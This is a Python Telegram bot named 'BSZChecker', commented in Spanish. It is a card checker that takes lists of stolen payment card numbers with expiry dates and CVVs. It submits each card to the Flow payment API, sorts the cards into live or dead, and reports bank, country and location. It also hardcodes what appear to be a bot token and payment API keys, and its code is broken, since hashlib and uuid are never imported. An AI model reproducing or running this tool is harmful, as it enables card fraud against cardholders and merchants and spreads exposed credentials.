import asyncio
import json
from aiohttp import ClientSession, ClientTimeout
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters

# Diccionario para almacenar los resultados de las tarjetas
results = {
    "live": [],
    "die": [],
    "unknown": []
}

# Solicita el token del bot
TOKEN = input("8439810935:AAEFnqLOSjwhRg4f6AmFL1H-ifr3umOxx7E ")

# URL base de la API de Flow
FLOW_URL = "https://api.flow.cl/api/payment/create"

# Credenciales de la API de Flow
FLOW_API_KEY = "60509DF1-3D9D-4B03-A7F4-4CB9LC6EA649"
FLOW_SECRET_KEY = "fab6effe60ec982f683d8982626fa6b1ee6c17cc"

# Función que genera la firma SHA-256 para la petición
def generar_firma(params, secret_key):
    cadena = ""

    for key in sorted(params.keys()):
        cadena += f"{key}{params[key]}"

    cadena += secret_key

    return hashlib.sha256(cadena.encode("utf-8")).hexdigest()

# Función que genera el mensaje detallado en formato HTML
def generar_mensaje(data: dict, tarjeta: str = 'N/A') -> str:
    card = data.get('card', {})
    country = card.get('country', {})
    location = country.get('location', {})

    code = data.get("code")
    status = data.get("status", "N/A")

    # Emoji de color según el código
    if code == 0:
        color_emoji = "🔴"
    elif code == 2:
        color_emoji = "🟡"
    else:
        color_emoji = "🟢"

    return f"""💳 <b>{card.get('card', tarjeta)}</b>
📊 <b>Status:</b> {color_emoji} {status} ({code})
💬 <b>Mensaje:</b> {data.get('message', 'Sin mensaje')}
🏦 <b>Banco:</b> {card.get('bank', 'Desconocido')}
📌 <b>Tipo:</b> {card.get('type', '?')} - {card.get('category', '?')}
🏷️ <b>Marca:</b> {card.get('brand', 'N/A')}
🌎 <b>País:</b> {country.get('name', 'N/A')} ({country.get('code', '-')}) {country.get('emoji', '')}
💱 <b>Moneda:</b> {country.get('currency', 'N/A')}
📍 <b>Geo:</b> Lat: {location.get('latitude', '?')}, Lng: {location.get('longitude', '?')}
✅ Verificado con el bot <b>BSZChecker</b>"""

# Comando /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "¡Hola! Envíame una lista de tarjetas separadas por línea (formato xxxx|xxxx|xxxx) para validarlas.\n"
        "También puedes mencionar al bot en un grupo con las tarjetas."
    )

# Manejador de validación
async def validate_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return

    bot_username = (await context.bot.get_me()).username
    if update.message.chat.type != "private" and f"@{bot_username}" not in update.message.text:
        return

    text = update.message.text.replace(f"@{bot_username}", "").strip()
    lines = [l.strip() for l in text.split('\n') if '|' in l]

    if not lines:
        await update.message.reply_text("❌ No se encontraron tarjetas válidas.")
        return

    live_count = die_count = unknown_count = 0
    await update.message.reply_text("🔍 Validando tarjetas...\n")

    async with ClientSession() as session:
        for tarjeta in lines:
            try:
                partes = [p.strip() for p in tarjeta.split("|")]

                number = partes[0] if len(partes) >= 1 and partes[0] else "5154620023923996"
                expiry_month = partes[1] if len(partes) >= 2 and partes[1] else "01"
                expiry_year = partes[2] if len(partes) >= 3 and partes[2] else "2029"
                cvv = partes[3] if len(partes) >= 4 and partes[3] else "120"

                params = {
                    "apiKey": FLOW_API_KEY,
                    "commerceOrder": f"ORD-{uuid.uuid4().hex[:12]}",
                    "cardNumber": number,
                    "expiryMonth": expiry_month,
                    "expiryYear": expiry_year,
                    "cvv": cvv
                }

                params['signature'] = generar_firma(params, FLOW_SECRET_KEY)

                async with session.post(
                    FLOW_URL,
                    headers={
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0'
                    },
                    json=params
                ) as res:
                    text_response = await res.text()

                    try:
                        data = json.loads(text_response)
                    except json.JSONDecodeError:
                        await update.message.reply_text(
                            f"⚠️ Respuesta inesperada para {tarjeta}:\n{text_response}"
                        )
                        results["unknown"].append(tarjeta)
                        unknown_count += 1
                        continue

                    card_info = data.get("card", {}).get("card", tarjeta)
                    code = data.get("code")
                    status = data.get("status", "N/A")

                    if code == 0:
                        results["die"].append(card_info)
                        die_count += 1
                    elif code == 2:
                        results["unknown"].append(card_info)
                        unknown_count += 1
                    else:
                        results["live"].append(card_info)
                        live_count += 1

                    mensaje = generar_mensaje(data, tarjeta)
                    await update.message.reply_text(mensaje, parse_mode='HTML')

            except Exception as e:
                results["die"].append(tarjeta)
                die_count += 1
                await update.message.reply_text(f"❌ Error al validar {tarjeta}:\n{e}")

            await asyncio.sleep(1)

        total = live_count + die_count + unknown_count
        resumen = f"""
✅ LIVE: {live_count}
❌ DIE: {die_count}
❓ UNKNOWN: {unknown_count}
📊 TOTAL: {total}
🔍 Verificado con el bot BSZChecker
🔍 Web : https://chekerv2bsz.foroactivo.com 
"""
        await update.message.reply_text(resumen)

# Inicializa el bot
def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, validate_cards))
    print("✅ Bot ejecutándose...")
    app.run_polling()

if __name__ == "__main__":
    main()